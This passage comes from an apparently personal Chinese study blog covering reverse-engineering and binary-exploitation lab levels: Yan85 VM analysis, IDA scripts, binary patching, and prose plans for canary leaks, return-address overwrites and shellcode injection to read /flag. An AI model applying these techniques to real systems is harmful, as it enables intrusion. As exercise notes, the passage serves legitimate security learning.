class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#什么需求直接谷歌比看文档快多了, 特别是这种简单语法......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这合理吗? 就硬堆数量……</p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote><p>噢, 有点东西, 完全看不出来发生了什么, 得反汇编看看.</p><p>用的md5, 没有办法reverse, 但是可以修改代码内容. </p></blockquote><ul><li>IDA 添加类型 在shift+f1的local types中添加. 也就是view中的open subviews. ctrl+1=quick view</li><li>gdb 与 set-uid 程序 与 $base</li><li>IDA number of operand.</li></ul><p>因为使用了<code>mprotect()</code>可以修改代码段, 所以直接找到jnz的地方改成jz. 也就是0x1f01处从75改成74.</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>使用bin_pedding函数把main函数填充到了2xxx的相对地址处, 不过同上.</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote><p>IDA的rename选项在手册的Give Name to the Location章, 查了下LOCAL and PUBLIC伪指令</p><p>我还得查下md5函数怎么用.</p></blockquote><p>直接把整个程序的每个部分进行一个hash, 所以修改其他地方无法通过验证. 而且只能修改2byte.</p><p>没事了, 连着改两个jnz就行了.</p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote><p>开始Yan85</p></blockquote><ul><li>LOAD segment 只是个没有名字的段, IDA默认整个名字上去. 可以在段介绍中看到pure data/code之类的.</li><li>递归学习:<ul><li>在IDA看到一个<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, 还以为七个字符是连在一起的. 结果发现UTF-16LE有特别的地方. 直接改成DATA就会出现\0间隔的字符.</li><li>然后就去查16LE是什么. 其实就是UTF-16的little-endian版本. Byte-Order-Mark etc.</li><li><strong>UTF-8优势在于ascii是1byte, 16优势在于非ascii是两字节, 32在于不用encoding and decoding</strong>.</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memset的一种实现方法, store string from rax by addr in rdi and counter in rcx.<br>leardx，[rbp+var_110]<br>moveax， 0<br>movecx，20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure><hr><p>Yan85: a1, a2, a3是arg no.</p><ul><li><p>在main函数中一个256字节的空间(char a1[256+7]), 后面跟着7byte用作七个寄存器的空间. 然后进入execute_program.</p></li><li><p>describe_register是将数字转换成一个字符, 总共有七个, 每个字符后面都有\0: <code>aNone           db &#39;NONE&#39;,0</code> </p></li><li><p>describe_* 后面的level可能会用到, 到时再说</p></li><li><p>write_register是将a2用作a1[256~262]的索引, 然后将a3写入数组中.</p><p><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p><p>**分别是 <code>8  4  64 32 16 2  1 </code> ** </p></li><li><p>write_memory被用在stm指令中</p></li></ul><p>然后分析<strong>每个指令</strong>作用: (reg)表示标号对应的寄存器的值.</p><ul><li>imm 就是     <code>(reg)a2 = a3</code> 加载立即数.</li><li>stm其实就是<code>mov [(reg)a2 + a1], a3</code> </li><li>syscall(a1, a2, a3), 假设寄存器为<strong>r1 r2 ~ r6</strong>, 然后<strong>if a2 == …</strong> <ul><li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3 = fd;</code> </li><li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li><li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li><li>16: sleep r1 secs, (reg)a3 = left_time</li><li>0x20: <code>exit(r1)</code> </li><li>else:  <code>exit( (reg)a3 )</code> </li></ul></li></ul><p>如果是12.1, 估计我写个gdb脚本会更方便我查看执行流程. 在每个函数入口处dumpargs, 然后打印出来. 12.0我就直接看看提示.</p><p>woc, 12.1都没有函数名称的, 我还得重命名一下函数. </p><p>看了前面的一点, 只要<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> 就行. 自动读取flag.</p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote><ul><li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li><li>cmp: 两个寄存器结果放在a1[262]里, 第五位作为标志位, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">小于 : 16  第5位<br>大于 : 8第4位<br>等于 : 4 第3位<br>不等于: <span class="hljs-number">2</span>      第<span class="hljs-number">2</span>位<br>两个全为零:<span class="hljs-number">1</span>   第<span class="hljs-number">1</span>位<br></code></pre></div></td></tr></table></figure></li><li><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**分别是 <code>16 64 1  4  8  32 2 </code> ** </li></ul></blockquote><p>看视频看到了新方法.</p><ul><li>遇到了一个指令解析错误, 只能undefine<code>crash</code>函数, 然后把字节设置成指令 设置函数end 设置新函数.</li><li>完全可以只用静态分析, 既然256字节空间之后跟着的是7个register, 那么可以定义一个结构体, 这样decompilerd result会更准确.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>对于describe_register()函数来说可以定义一个enum变量, 就不用搁那翻译每个寄存器是对应哪个数字了.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote><p>emmmmm好像也没什么意义, 纯粹花时间看懂一个流程罢了. 只是复杂度的简单叠加, 把输入的每个bit进行一个加法操作.</p></blockquote><p>这题是0x81位置上先放九个数, 然后再分别加上一个数字, 然后, 就那样..</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>还是加上一个数, 勉强做一下. 果然是浪费时间.</p><h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote><p>开始Yan85 byte code. 直接从没有符号的版本入手开始占卜(</p></blockquote><p><del>IDA反编译出了问题, 实在是逆转前三个字节顺序的汇编代码太神奇, 一堆符号拓展 零拓展什么的.</del> 然后发现并没有问题.</p><p>发现指令编码是这样一个结构:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在IDA中使用IDC编写脚本(gdb script也行, 也可以设置临时变量之类的).</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><p>设置完之后就会出现非常漂亮的一个输出, 不过很长, 而且这种输出是会跟着程序流变化的, 不利于整体上的静态分析. 下次尝试避开所有跳转, 按顺序打印出所有的代码, 不然跳来跳去的真的很难看.</p><p>结果就是简单的判断字符串相等, 总共9字节. 都在log文件里.</p><h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>先跳过, 感觉就是复杂度的堆积, 又或者是我方向错了. 到时回来看.</p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>Yan85 shellcoding. 直接做<code>.0</code>题目, 省点事.</p><p>输入<code>0x300uLL</code>字节的bytecode, 前768字节是指令最多256条, 后面是内存空间, 再后面是寄存器.</p><p>完全由我控制的话首先是往内存中放入/flag字符串, 然后open(path in memory) -&gt; read to memory -&gt; write to stdout. 再结合一下题目里的寄存器, 操作数和顺序就行. 估计得写个python函数自动生成.</p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p>更特别了. 主要是这个<code>rerandomize()</code>函数, 其中寄存器, 指令, 系统调用, cmp标志位全部都是随机的. 随机的方法是8个int8随机选取两个进行交换, 执行65535次.</p><p>难道是在变化中找到不变的东西?</p><p>噢虽然是随机的但是由于rand的特点(种子和flag有关), 每次的值都不会变, 这样子只要编写一些logic去brute force一些指令和值就可以了.</p><h1 id="module-8-exp"><a href="#module-8-exp" class="headerlink" title="module 8-exp"></a>module 8-exp</h1><ul><li>时至2022年4月22日, c语言排名<a href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) <span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure><ul><li><p>stack canary mitigations:</p><ul><li><p><strong>leak the canary.</strong> </p></li><li><p><strong>brute-force the canary(for forking processes)</strong> </p></li><li><p><strong>modify the canary.</strong>  </p></li><li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p></li><li><p>the canary begins with null-byte.</p></li></ul></li><li><p>alsr mitigation:</p><ul><li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li><li><code>setarch x86_64 -R /bin/zsh</code> command</li></ul></li><li><p>uninitilized data.</p><ul><li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li></ul></li></ul><hr><ul><li>整了pwndbg+tmux的组合视图, 感觉, 有一点点点点用吧…<p hidden>我是真有精力搞这个…</p>成功在tmux里面套娃screen.</li><li>使用gdb加上core文件 <a href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul><li><strong>ulimit -c unlimited</strong> : 解除core dump文件大小限制, 或者直接加在zshrc里面.</li><li>然后<code>gdb-pwndbg [filename] [coredump]</code> </li><li>视频中使用了cyclic加上gdb core来查看返回地址从而发现buf的溢出位置.</li><li>也可以使用valgrind, 不过参数较多.</li><li>pwn也有coredump函数.</li></ul></li></ul><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>简单的忘记了</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>修改返回地址. </p><h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb 调试出现问题, read一个大数字就会bad address, 直接执行没有出现….</p><h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p><p>challenge堆栈有没有实用的位置, 应该就是对齐.</p><p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>和rev的18题差不多, 但是Yan85的open syscall被禁用. 他说有个memory error, 在哪里呢.</p><p>保护全关, 可执行栈. 根本没有open这个libc函数, 需要hijack shellcode, 注入到哪里呢? </p><p>发现了, 一个read到栈空间的调用没有检查边界:</p><img src="../../image/pwn-modules/image-20220503162403150.png" alt="image-20220503162403150" style="zoom:80%;" /><ul><li>不过要注意r2和r3只有1字节, 最多就是256. </li><li>反正各种保护都没开, 可以直接定位shellcode的位置. 总共长36字节.</li><li>shellcode得调用syscall, 还是用chmod简单点, shellcode就加在一开始的byte code中. 对shellcode进行Yan85译码可能会出问题, 在byte code结束之前还要修改r6的值来直接跳到指令的末尾.</li><li>Yan85 code直接从memory[1024]开始, 覆盖8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul><li>还有一些细节, 覆盖r6的时候可以直接修改成256在下一次译码结束执行, 这样子就不用多余的操作修改r6.</li></ul></li></ul><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这题在上一题的基础之上加了canary和PIE.</p><p>其余部分应该是一样的, 溢出点也是一样的. 对了, write函数也没有边界检查, 可以利用这个来leak出canary和rbp.</p><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护半开, 可用open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p><p>只允许byte code中出现一次syscall.</p><p>但是发现read_memory的目的地变成了指令的区域. 于是就可以使用这个调用来输入新的代码去覆盖旧的.</p><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p><p>这???</p><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p><h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p><p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" alt="image-20220430102917561" style="zoom:80%;" /><p>栈上的地址最低12位都是随机的. 怕不是每次运行的时候_start和__libc_start_main函数都会用到不同的栈空间大小…也许是aslr把stackbase也改了.<br>这下子只能连rbp都给leak出来了.</p><ol><li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li><li>second exec to leak first challenge’s <strong>rbp</strong>, and then calc the shellcode position.</li><li>third exec to jmp to shellcode.</li></ol><p><del>不对, 第一次leak canary的时候也可以leak出main的rbp,</del> 没事了, main的rbp可以用但没必要.</p><ul><li>没有push imm64这条指令.</li><li>一开始用chmod+.ascii “flag”的做法, 发现自己加了一个空字符, 只能通过栈来尝试. 想了想, 栈指针加8也不会对第一个challenge的栈帧造成什么影响. 换成下面这个, 注意小端法.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] 